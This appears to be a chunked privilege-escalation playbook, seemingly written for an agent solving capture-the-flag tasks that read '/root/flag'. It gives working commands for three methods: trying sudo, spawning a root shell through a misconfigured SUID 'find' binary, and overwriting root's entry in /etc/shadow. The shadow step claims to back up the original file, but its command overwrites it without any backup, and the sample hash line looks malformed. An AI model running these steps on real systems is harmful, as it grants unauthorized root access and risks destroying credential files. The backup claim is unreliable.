# local privileges escalation

<chunk>

### Try Switching to Root User

Use following command to switch to the root user:

```bash
sudo -i
```
Then attempt to access the target file again. if you are not in the sudoer or failed to switch to the root user, then your conditions do not meet expectations.



</chunk>
<chunk>

### SUID Binaries
1. You can try exploiting misconfigured SUID binaries for privileges escalation. Firstly look for binaries with the SUID bit set.

```bash
find /bin/ /usr/bin/ -perm -4000 -type f 2>/dev/null
```

2. Check if there is any exploitable binary (like `nmap`, `find`, etc.) that may allow privilege escalation. Example:

```bash
<path to Exploitable binaries found before> / -exec /bin/bash \; -quit
```

for example, if you found `/usr/bin/find`, you can use
```bash
/usr/bin/find / -exec /bin/bash -p  \; -quit
```
It is normal for this command to have no output, as it switches the bash script.

3. The success of the previous step does not mean that you have obtained sudo permissions. You can verify it by executing the command, for example, if you need to read the flag file in root user's directory, use:

```bash
cat /root/flag
```
If permission denied appears, it means that the privilege escalation failed and you can exit to try other solutions.

</chunk>
<chunk>

### Password Modification

The password file in Linux is stored at /etc/shadow. If you have read and write permissions for this file, you can escalate privileges locally by modifying the root user's password.

1. First, check if you have permission to access the /etc/shadow file with the following command:

```bash
ls -la /etc/shadow
```

2. If you have read and write access (e.g. permissions -rw-rwx---), you can try modifying the root user's password. To prevent data loss, back up the original file by saving the modified version to `/tmp/shadow`, and replace the original /etc/shadow file with your modified version:

```bash
sed 's|^root:.*$|root:<new password>|' /etc/shadow > /tmp/shadow && cat /tmp/shadow > /etc/shadow
```
Replace <new password> with the hashed value of your new password. You can set the password to `password``, the corresponding hash might look like this:
```bash
$y$j9T$LyUuW7eq0q8Ri37tZeZ2x.$V.v9W1nh7f57CR9ln4JYYVA7GJk.MNswwEW4bB2z7Y7:19821:0:99999:7:::
```

3. Finally, use the su - command:
```bash
su -
```
to switch to the root user and access the target flag file:
```bash
cat /root/flag
```

</chunk>